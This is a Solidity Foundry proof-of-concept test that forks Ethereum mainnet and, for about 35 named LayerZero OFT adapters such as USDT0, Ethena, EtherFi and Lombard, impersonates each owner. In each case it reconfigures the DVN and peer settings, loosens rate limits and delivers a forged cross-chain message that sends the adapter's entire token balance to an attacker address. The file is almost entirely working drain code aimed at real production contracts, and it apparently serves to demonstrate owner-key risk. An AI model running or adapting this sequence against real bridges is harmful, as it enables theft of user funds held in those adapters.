// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface VmLz {
    function createSelectFork(string calldata url) external returns (uint256 forkId);
    function envOr(string calldata key, string calldata defaultValue) external returns (string memory value);
    function prank(address msgSender) external;
}

interface IERC20Lz {
    function balanceOf(address account) external view returns (uint256);
}

interface IOApp {
    function setPeer(uint32 eid, bytes32 peer) external;
}

interface IOFTAdapter {
    function decimalConversionRate() external view returns (uint256);
}

interface IEtherFiInboundRateLimits {
    struct InboundRateLimit {
        uint32 peerEid;
        uint256 limit;
        uint256 window;
    }

    function setInboundRateLimits(InboundRateLimit[] calldata limits) external;
}

interface ILombardRateLimits {
    struct RateLimit {
        bytes32 peer;
        uint256 limit;
        uint256 window;
    }

    function setRateLimits(RateLimit[] calldata limits, uint8 direction) external;
}

interface ILayerZeroEndpointV2 {
    struct SetConfigParam {
        uint32 eid;
        uint32 configType;
        bytes config;
    }

    struct Origin {
        uint32 srcEid;
        bytes32 sender;
        uint64 nonce;
    }

    function setConfig(address oapp, address lib, SetConfigParam[] calldata params) external;
    function lzReceive(
        Origin calldata origin,
        address receiver,
        bytes32 guid,
        bytes calldata message,
        bytes calldata extraData
    ) external payable;
}

interface IReceiveUln302 {
    function verify(bytes calldata packetHeader, bytes32 payloadHash, uint64 confirmations) external;
    function commitVerification(bytes calldata packetHeader, bytes32 payloadHash) external;
}

contract LayerZeroOFTSafeDVNPoC {
    VmLz private constant vm = VmLz(address(uint160(uint256(keccak256("hevm cheat code")))));

    address private constant ENDPOINT = address(uint160(0x001a44076050125825900e736c501f859c50fe728c));
    address private constant RECEIVE_ULN302 = 0xc02Ab410f0734EFa3F14628780e6e695156024C2;
    address private constant ATTACKER = 0xDEad0000000000000000000000000000DeaDBEEF;
    address private constant ATTACKER_PEER = address(uint160(0x001111111111111111111111111111111111111111));
    uint32 private constant SRC_EID = 30110;
    uint32 private constant DST_EID = 30101;
    uint64 private constant NONCE = 1;
    bytes32 private constant GUID = 0x7979797979797979797979797979797979797979797979797979797979797979;

    struct Case {
        string name;
        address adapter;
        address owner;
        address token;
        bool useDecimalConversionRate;
    }

    struct UlnConfig {
        uint64 confirmations;
        uint8 requiredDVNCount;
        uint8 optionalDVNCount;
        uint8 optionalDVNThreshold;
        address[] requiredDVNs;
        address[] optionalDVNs;
    }

    function setUp() public {
        string memory rethRpc = vm.envOr("RETH_RPC", "http://127.0.0.1:8545");
        string memory rpc = vm.envOr("MAINNET_RPC_URL", rethRpc);
        vm.createSelectFork(rpc);
    }

    function test_usdt0_oft_oadapterupgradeable_a41dee() public {
        _run(
            Case({
                name: "USDT0 - OFT OAdapterUpgradeable",
                adapter: address(uint160(0x006c96de32cea08842dcc4058c14d3aaad7fa41dee)),
                owner: address(uint160(0x004dff9b5b0143e642a3f63a5bcf2d1c328e600bf8)),
                token: address(uint160(0x00dac17f958d2ee523a2206206994597c13d831ec7)),
                useDecimalConversionRate: false
            })
        );
    }

    function test_ethena_oft_usdeoftadapter_52ef34() public {
        _run(
            Case({
                name: "Ethena - OFT USDeOFTAdapter",
                adapter: address(uint160(0x005d3a1ff2b6bab83b63cd9ad0787074081a52ef34)),
                owner: address(uint160(0x003b0aaf6e6fcd4a7ceef8c92c32dfea9e64dc1862)),
                token: address(uint160(0x004c9edd5852cd905f086c759e8383e09bff1e68b3)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_ethena_oft_stakedusdeoftadapter_5fe5d2() public {
        _run(
            Case({
                name: "Ethena - OFT StakedUSDeOFTAdapter",
                adapter: address(uint160(0x00211cc4dd073734da055fbf44a2b4667d5e5fe5d2)),
                owner: address(uint160(0x003b0aaf6e6fcd4a7ceef8c92c32dfea9e64dc1862)),
                token: address(uint160(0x009d39a5de30e57443bff2a8307a4256c8797a3497)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_kerneldao_bridge_rseth_oftadapter_e98ef3() public {
        _run(
            Case({
                name: "KernelDAO: Bridge RSETH_OFTAdapter",
                adapter: address(uint160(0x0085d456b2dff1fd8245387c0bfb64dfb700e98ef3)),
                owner: address(uint160(0x00cbcdd778aa25476f203814214dd3e9b9c46829a1)),
                token: address(uint160(0x00a1290d69c65a6fe4df752f95823fae25cb99e5a7)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_etherfi_oft_etherfioftadapterupgradeable_cdca63() public {
        _run(
            Case({
                name: "EtherFi - OFT EtherfiOFTAdapterUpgradeable",
                adapter: address(uint160(0x00cd2eb13d6831d4602d80e5db9230a57596cdca63)),
                owner: address(uint160(0x002aca71020de61bb532008049e1bd41e451ae8adc)),
                token: address(uint160(0x00cd5fe23c85820f7b72d0926fc9b05b43e359b7ee)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_transparentupgradeableproxy_transparentupgradeableproxy_1697() public {
        _run(
            Case({
                name: "TransparentUpgradeableProxy TransparentUpgradeableProxy",
                adapter: address(uint160(0x00c0d626efba75d74d6c50e3b1dadbb41d32169748)),
                owner: address(uint160(0x001869bfd77d61d5025471b095221e97388f6bb849)),
                token: address(uint160(0x005a9610919f5e81183823a2be4bd1beb2b4da2a20)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_thbilloftadapter_thbilloftadapter_f55a5a() public {
        _run(
            Case({
                name: "ThBillOFTAdapter ThBillOFTAdapter",
                adapter: address(uint160(0x00fdd22ce6d1f66bc0ec89b20bf16ccb6670f55a5a)),
                owner: address(uint160(0x0094877640dd9e6f1e3cb56bf7b5665b7152601295)),
                token: address(uint160(0x005fa487bca6158c64046b2813623e20755091da0b)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_mlrtoftadapter_mlrtoftadapter_376e24() public {
        _run(
            Case({
                name: "MLRTOFTAdapter MLRTOFTAdapter",
                adapter: address(uint160(0x004176e11de6707c1d12d0ca89f40706dcf6376e24)),
                owner: address(uint160(0x00f433c2a2d6facecdd9edd7b8ce9ceaab96f41866)),
                token: address(uint160(0x0018f313fc6afc9b5fd6f0908c1b3d476e3fea1dd9)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_stakestonelayerzeroadapter_stakestonelayerzeroadapter_f7c1ef() public {
        _run(
            Case({
                name: "StakeStoneLayerZeroAdapter StakeStoneLayerZeroAdapter",
                adapter: address(uint160(0x00219fcc806358a8fcd5e207b37db0f5b6f5f7c1ef)),
                owner: address(uint160(0x000014b2f46aa53077f8b7fbdb53a8288636c189c9)),
                token: address(uint160(0x001d88713b483a8e45cff0e5cd7c2e15e5fab4534d)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_triaoftadapter_triaoftadapter_0d4791() public {
        _run(
            Case({
                name: "TriaOFTAdapter TriaOFTAdapter",
                adapter: address(uint160(0x00f1df8aa0b7955b23b10d80193a412ac5650d4791)),
                owner: address(uint160(0x008fdb5a7dff1dec06a2efd5778a237b80715515a7)),
                token: address(uint160(0x00228bec415ade4b61d7caf0adf8c91eac587ba369)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_enaoftadapter_enaoftadapter_9c0133() public {
        _run(
            Case({
                name: "ENAOFTAdapter ENAOFTAdapter",
                adapter: address(uint160(0x0058538e6a46e07434d7e7375bc268d3cb839c0133)),
                owner: address(uint160(0x003b0aaf6e6fcd4a7ceef8c92c32dfea9e64dc1862)),
                token: address(uint160(0x0057e114b691db790c35207b2e685d4a43181e6061)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_deboxtokenoftadapter_deboxtokenoftadapter_ed4b26() public {
        _run(
            Case({
                name: "DeBoxTokenOFTAdapter DeBoxTokenOFTAdapter",
                adapter: address(uint160(0x00e3b60790607afe418adcaadcb5e07f8124ed4b26)),
                owner: address(uint160(0x007393c2ed462ce04d5c923bf7e8953be7d7c736ac)),
                token: address(uint160(0x0032b77729cd87f1ef2bea4c650c16f89f08472c69)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_gizaoftadapter_gizaoftadapter_ec97c3() public {
        _run(
            Case({
                name: "GizaOFTAdapter GizaOFTAdapter",
                adapter: address(uint160(0x000b0e004b88a9c37453ad75c450f1147e9dec97c3)),
                owner: address(uint160(0x00a87dd67893ab39ace5c55501f6f9c1b390f86ae0)),
                token: address(uint160(0x00590830dfdf9a3f68afcdde2694773debdf267774)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_robooftadapter_robooftadapter_ba6d6f() public {
        _run(
            Case({
                name: "RoboOFTAdapter RoboOFTAdapter",
                adapter: address(uint160(0x00407a5fb66cb1b3d50004f7091c08a27b42ba6d6f)),
                owner: address(uint160(0x001e63183fb2123f0674582a5a2d251e72de0bd8bf)),
                token: address(uint160(0x0032b4d049fe4c888d2b92eecaf729f44df6b1f36e)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_pdtoftadapter_pdtoftadapter_61e07e() public {
        _run(
            Case({
                name: "PDTOFTAdapter PDTOFTAdapter",
                adapter: address(uint160(0x00eff2a458e464b07088bdb441c21a42ab4b61e07e)),
                owner: address(uint160(0x00de6789416001db6f295e47d5c58b9e17de70ce65)),
                token: address(uint160(0x00375abb85c329753b1ba849a601438ae77eec9893)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_transparentupgradeableproxy_transparentupgradeableproxy_3f7c() public {
        _run(
            Case({
                name: "TransparentUpgradeableProxy TransparentUpgradeableProxy",
                adapter: address(uint160(0x0060af2681bcc4886935f428a1386a4a68973f7c4f)),
                owner: address(uint160(0x004e59e778a0fb77fbb305637435c62faed9aed40f)),
                token: address(uint160(0x003c3a81e81dc49a522a592e7622a7e711c06bf354)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_usdt_oft_layerzero_usdtoftadapter_474950() public {
        _run(
            Case({
                name: "USDT OFT / LayerZero USDTOFTAdapter",
                adapter: address(uint160(0x005e87d7e75b272fb7150b4d1a05afb6bd71474950)),
                owner: address(uint160(0x00d7e22951de7af453aac5400d6e072e3b63beb7e2)),
                token: address(uint160(0x00dac17f958d2ee523a2206206994597c13d831ec7)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_acuoftadapter_acuoftadapter_ca33be() public {
        _run(
            Case({
                name: "AcuOFTAdapter AcuOFTAdapter",
                adapter: address(uint160(0x004ad11f4d6b4626e426fbe88e8f1c78f469ca33be)),
                owner: address(uint160(0x0095d490789d043d32fd33aa058afe1c8772c61e48)),
                token: address(uint160(0x00216b3643ff8b7bb30d8a48e9f1bd550126202add)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_erc1967proxy_erc1967proxy_d49e11() public {
        _run(
            Case({
                name: "ERC1967Proxy ERC1967Proxy",
                adapter: address(uint160(0x00dcb612005417dc906ff72c87df732e5a90d49e11)),
                owner: address(uint160(0x002aca71020de61bb532008049e1bd41e451ae8adc)),
                token: address(uint160(0x001abaea1f7c830bd89acc67ec4af516284b1bc33c)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_the_sandbox_oftadapterforsand_002dcf() public {
        _run(
            Case({
                name: "The Sandbox OFTAdapterForSand",
                adapter: address(uint160(0x00ac531eb26ca1d21b85126de8fb87e80e09002dcf)),
                owner: address(uint160(0x006ec4090d0f3cb76d9f3d8c4d5bb058a225e560a1)),
                token: address(uint160(0x003845badade8e6dff049820680d1f14bd3903a5d0)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_usdc_oft_layerzero_usdcoftadapter_d9eff2() public {
        _run(
            Case({
                name: "USDC OFT / LayerZero USDCOFTAdapter",
                adapter: address(uint160(0x00c209a627a7b0a19f16a963d9f7281667a2d9eff2)),
                owner: address(uint160(0x00d7e22951de7af453aac5400d6e072e3b63beb7e2)),
                token: address(uint160(0x00a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_pufferadapter_pufferadapter_edd83f() public {
        _run(
            Case({
                name: "PUFFERAdapter PUFFERAdapter",
                adapter: address(uint160(0x003ea9bb9fcdcc1c37cb09175aecdb488a97edd83f)),
                owner: address(uint160(0x00c0896ab1a8cae8c2c1d27d011eb955cca955580d)),
                token: address(uint160(0x004d1c297d39c5c1277964d0e3f8aa901493664530)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_transparentupgradeableproxy_transparentupgradeableproxy_9e9a() public {
        _run(
            Case({
                name: "TransparentUpgradeableProxy TransparentUpgradeableProxy",
                adapter: address(uint160(0x00688aee022aa544f150678b8e5720b6b96a9e9a2f)),
                owner: address(uint160(0x00ce1ce7c7f436dcc4e28bc8bf86115514d3dc34e8)),
                token: address(uint160(0x00643c4e15d7d62ad0abec4a9bd4b001aa3ef52d66)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_morphooftadapter_morphooftadapter_5649d9() public {
        _run(
            Case({
                name: "MorphoOFTAdapter MorphoOFTAdapter",
                adapter: address(uint160(0x0050d3d6fd7518682155e3c1b65fdd50e1b35649d9)),
                owner: address(uint160(0x00cba28b38103307ec8da98377fff9816c164f9afa)),
                token: address(uint160(0x0058d97b57bb95320f9a05dc918aef65434969c2b2)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_iskraoftadapter_iskraoftadapter_3bcf8f() public {
        _run(
            Case({
                name: "IskraOFTAdapter IskraOFTAdapter",
                adapter: address(uint160(0x00f1ba5c811ae1f72fd87cfbfc04f781a12e3bcf8f)),
                owner: address(uint160(0x006727b22867e7ece399aa306f94d5521f59a59a12)),
                token: address(uint160(0x0017d2628d30f8e9e966c9ba831c9b9b01ea8ea75c)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_transparentupgradeableproxy_transparentupgradeableproxy_1ad0() public {
        _run(
            Case({
                name: "TransparentUpgradeableProxy TransparentUpgradeableProxy",
                adapter: address(uint160(0x00234c908e749961d0329a0ed5916d55a99d1ad06c)),
                owner: address(uint160(0x00d6889f307be1b83bb355d5da7d4478fb0d2af547)),
                token: address(uint160(0x004956b52ae2ff65d74ca2d61207523288e4528f96)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_wilderworldoftadapter_wilderworldoftadapter_58db0d() public {
        _run(
            Case({
                name: "WilderWorldOFTAdapter WilderWorldOFTAdapter",
                adapter: address(uint160(0x00afde2490236bc64950def5472296aa0d9758db0d)),
                owner: address(uint160(0x00f2afa0e4e9b3219600eec4ed8b326540fd9a7db1)),
                token: address(uint160(0x002a3bff78b79a009976eea096a51a948a3dc00e34)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_myoftadapter_myoftadapter_d9b433() public {
        _run(
            Case({
                name: "MyOFTAdapter MyOFTAdapter",
                adapter: address(uint160(0x00801642b6efb861fe624dad704b7a747779d9b433)),
                owner: address(uint160(0x0021fe3e26e824783ca7e374355a8d30ae8bbf6e37)),
                token: address(uint160(0x0002f92800f57bcd74066f5709f1daa1a4302df875)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_swelloftadapter_swelloftadapter_9d85b7() public {
        _run(
            Case({
                name: "SwellOFTAdapter SwellOFTAdapter",
                adapter: address(uint160(0x0009341022ea237a4db1644de7ccf8fa0e489d85b7)),
                owner: address(uint160(0x0020fdf47509c5efc0e1101e3ce443691781c17f90)),
                token: address(uint160(0x000a6e7ba5042b38349e437ec6db6214aec7b35676)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_transparentupgradeableproxy_transparentupgradeableproxy_4519() public {
        _run(
            Case({
                name: "TransparentUpgradeableProxy TransparentUpgradeableProxy",
                adapter: address(uint160(0x00ab17c1fe647c37ceb9b96d1c27dd189bf8451978)),
                owner: address(uint160(0x00d6889f307be1b83bb355d5da7d4478fb0d2af547)),
                token: address(uint160(0x001202f5c7b4b9e47a1a484e8b270be34dbbc75055)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_weth_oft_layerzero_wethoftadapter_a526e8() public {
        _run(
            Case({
                name: "WETH OFT / LayerZero WETHOFTAdapter",
                adapter: address(uint160(0x0006e01cb086fea9c644a2c105a9f20cfc21a526e8)),
                owner: address(uint160(0x00d7e22951de7af453aac5400d6e072e3b63beb7e2)),
                token: address(uint160(0x00c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_lombard_lbtcoftadapter_126c31() public {
        _run(
            Case({
                name: "Lombard LBTCOFTAdapter",
                adapter: address(uint160(0x00acb11bc20b1945e59976e3307d2a805faa126c31)),
                owner: address(uint160(0x00251a604e8e8f6906d60f8dedc5aaeb8cd38f4892)),
                token: address(uint160(0x008236a87084f8b84306f72007f36f2618a5634494)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_usdt_oft_layerzero_usdtoft_15dfb0() public {
        _run(
            Case({
                name: "USDT OFT / LayerZero UsdtOFT",
                adapter: address(uint160(0x001f748c76de468e9d11bd340fa9d5cbadf315dfb0)),
                owner: address(uint160(0x00a4e99d8dbf3accc7adb7b6d090181f5ae0460a18)),
                token: address(uint160(0x00dac17f958d2ee523a2206206994597c13d831ec7)),
                useDecimalConversionRate: false
            })
        );
    }

    function test_lombard_lbtcoftadapter_d95299() public {
        _run(
            Case({
                name: "Lombard LBTCOFTAdapter",
                adapter: address(uint160(0x003a7647c1323144a16e7d0d71a581e3fe5bd95299)),
                owner: address(uint160(0x00251a604e8e8f6906d60f8dedc5aaeb8cd38f4892)),
                token: address(uint160(0x008236a87084f8b84306f72007f36f2618a5634494)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_resolv_usroftadapter_d4be0e() public {
        _run(
            Case({
                name: "Resolv USROFTAdapter",
                adapter: address(uint160(0x00d2ee2776f34ef4e7325745b06e6d464b08d4be0e)),
                owner: address(uint160(0x00d6889f307be1b83bb355d5da7d4478fb0d2af547)),
                token: address(uint160(0x0066a1e37c9b0eaddca17d3662d6c05f4decf3e110)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_swell_rswethoftadapter_575079() public {
        _run(
            Case({
                name: "Swell rswETHOFTAdapter",
                adapter: address(uint160(0x001486d39646cdee84619bd05997319545a8575079)),
                owner: address(uint160(0x0020fdf47509c5efc0e1101e3ce443691781c17f90)),
                token: address(uint160(0x00fae103dc9cf190ed75350761e95403b7b8afa6c0)),
                useDecimalConversionRate: true
            })
        );
    }

    function _run(Case memory c) internal {
        uint256 beforeAdapter = IERC20Lz(c.token).balanceOf(c.adapter);
        uint256 beforeAttacker = IERC20Lz(c.token).balanceOf(ATTACKER);
        require(beforeAdapter > 0, "adapter token balance is zero");

        uint256 conversionRate = c.useDecimalConversionRate
            ? IOFTAdapter(c.adapter).decimalConversionRate()
            : 1;
        require(conversionRate > 0, "decimalConversionRate is zero");
        uint256 amountSd = beforeAdapter / conversionRate;
        require(amountSd > 0, "amountSD is zero");
        require(amountSd <= type(uint64).max, "amountSD overflows uint64");
        uint256 amountLd = amountSd * conversionRate;

        uint32 srcEid = _srcEid(c.adapter);
        bytes32 ownerB32 = _addressToBytes32(c.owner);
        bytes32 attackerPeerB32 = _addressToBytes32(ATTACKER_PEER);
        bytes32 recipientB32 = _addressToBytes32(ATTACKER);
        bytes32 adapterB32 = _addressToBytes32(c.adapter);

        address[] memory requiredDvns = new address[](1);
        requiredDvns[0] = c.owner;
        address[] memory optionalDvns = new address[](0);
        bytes memory ulnConfig = abi.encode(
            UlnConfig({
                confirmations: 1,
                requiredDVNCount: 1,
                optionalDVNCount: 255,
                optionalDVNThreshold: 0,
                requiredDVNs: requiredDvns,
                optionalDVNs: optionalDvns
            })
        );

        ILayerZeroEndpointV2.SetConfigParam[] memory params =
            new ILayerZeroEndpointV2.SetConfigParam[](1);
        params[0] = ILayerZeroEndpointV2.SetConfigParam({
            eid: srcEid,
            configType: 2,
            config: ulnConfig
        });

        bytes memory packetHeader = abi.encodePacked(
            uint8(1),
            NONCE,
            srcEid,
            attackerPeerB32,
            DST_EID,
            adapterB32
        );
        require(packetHeader.length == 81, "bad packet header length");
        bytes memory message = _oftMessage(c.adapter, recipientB32, uint64(amountSd));
        bytes32 payloadHash = keccak256(abi.encodePacked(GUID, message));

        vm.prank(c.owner);
        ILayerZeroEndpointV2(ENDPOINT).setConfig(c.adapter, RECEIVE_ULN302, params);

        vm.prank(c.owner);
        IOApp(c.adapter).setPeer(srcEid, attackerPeerB32);

        _applyRateLimitIfNeeded(c, srcEid, amountLd);

        vm.prank(c.owner);
        IReceiveUln302(RECEIVE_ULN302).verify(packetHeader, payloadHash, 1);

        vm.prank(c.owner);
        IReceiveUln302(RECEIVE_ULN302).commitVerification(packetHeader, payloadHash);

        vm.prank(c.owner);
        ILayerZeroEndpointV2(ENDPOINT).lzReceive(
            ILayerZeroEndpointV2.Origin({srcEid: srcEid, sender: attackerPeerB32, nonce: NONCE}),
            c.adapter,
            GUID,
            message,
            ""
        );

        uint256 afterAdapter = IERC20Lz(c.token).balanceOf(c.adapter);
        uint256 afterAttacker = IERC20Lz(c.token).balanceOf(ATTACKER);
        require(afterAttacker > beforeAttacker, "attacker token balance did not increase");
        require(afterAttacker - beforeAttacker == amountLd, "unexpected attacker delta");
        require(beforeAdapter - afterAdapter == amountLd, "unexpected adapter delta");
        ownerB32;
        bytes(c.name);
    }

    function _srcEid(address adapter) internal pure returns (uint32) {
        if (
            adapter == address(uint160(0x00cd2eb13d6831d4602d80e5db9230a57596cdca63))
                || adapter == address(uint160(0x00acb11bc20b1945e59976e3307d2a805faa126c31))
                || adapter == address(uint160(0x003a7647c1323144a16e7d0d71a581e3fe5bd95299))
        ) {
            return 30106;
        }
        return SRC_EID;
    }

    function _oftMessage(address adapter, bytes32 recipient, uint64 amountSd) internal pure returns (bytes memory) {
        bytes memory payload = abi.encodePacked(recipient, amountSd);
        if (adapter == address(uint160(0x001f748c76de468e9d11bd340fa9d5cbadf315dfb0))) {
            return abi.encodePacked(uint16(2), payload);
        }
        require(payload.length == 40, "bad OFT message length");
        return payload;
    }

    function _applyRateLimitIfNeeded(Case memory c, uint32 srcEid, uint256 amountLd) internal {
        uint256 limit = amountLd * 2;
        if (c.adapter == address(uint160(0x00cd2eb13d6831d4602d80e5db9230a57596cdca63))) {
            IEtherFiInboundRateLimits.InboundRateLimit[] memory limits =
                new IEtherFiInboundRateLimits.InboundRateLimit[](1);
            limits[0] = IEtherFiInboundRateLimits.InboundRateLimit({
                peerEid: srcEid,
                limit: limit,
                window: 1
            });
            vm.prank(c.owner);
            IEtherFiInboundRateLimits(c.adapter).setInboundRateLimits(limits);
        }
        if (
            c.adapter == address(uint160(0x00acb11bc20b1945e59976e3307d2a805faa126c31))
                || c.adapter == address(uint160(0x003a7647c1323144a16e7d0d71a581e3fe5bd95299))
        ) {
            ILombardRateLimits.RateLimit[] memory limits = new ILombardRateLimits.RateLimit[](1);
            limits[0] = ILombardRateLimits.RateLimit({
                peer: bytes32(uint256(srcEid)),
                limit: limit,
                window: 1
            });
            vm.prank(c.owner);
            ILombardRateLimits(c.adapter).setRateLimits(limits, 0);
        }
    }

    function _addressToBytes32(address account) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(account)));
    }
}
